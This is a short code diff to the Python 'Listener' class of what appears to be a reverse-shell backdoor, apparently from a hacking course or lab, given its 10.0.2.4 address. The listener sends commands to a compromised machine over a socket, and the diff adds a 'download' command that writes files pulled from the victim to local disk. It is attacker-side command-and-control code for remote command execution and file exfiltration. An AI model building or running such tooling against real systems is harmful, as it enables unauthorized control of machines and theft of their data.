@@ -28,9 +28,12 @@ class Listener:
             except ValueError:
                 continue
 
+    def write_file(self, path, content):
+        with open(path,'wb') as file:
+            file.write(content)
+            return "[+] Download successful. . ."
+
     def execute_remotely(self, command):
-        # self.connection.send(command)
-        # return self.connection.recv(2048).decode()
         self.send_json(command)
         if(command[0].lower() == "exit"):
             self.connection.close()
@@ -43,6 +46,11 @@ class Listener:
             command = raw_input(">> ")
             command = command.split(" ")
             result = self.execute_remotely(command)
+
+            #download file
+            if(command[0] == "download"):
+                result = self.write_file(command[1], result)
+
             print(result)
 
 ip = "10.0.2.4"
